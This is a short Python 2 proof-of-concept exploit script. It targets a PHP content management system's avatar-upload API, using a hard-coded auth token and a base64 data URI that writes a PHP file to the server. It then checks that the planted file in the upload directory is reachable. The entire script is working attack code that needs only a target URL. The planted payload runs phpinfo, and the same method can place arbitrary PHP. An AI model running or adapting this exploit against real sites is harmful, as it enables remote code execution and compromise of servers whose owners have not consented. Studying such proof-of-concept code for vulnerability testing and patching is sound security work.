import random
import sys
import requests
def poc(target):
    payload="/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"
    url=target+payload
    shell=target+'/uploadfile/member/0/0x0.php'
    try:
        result=requests.get(url,timeout=3)
        verify=requests.get(shell,timeout=3)
        if verify.status_code==200 and 'code' in verify.text:
            return True
    except Exception,e:
        print e
        
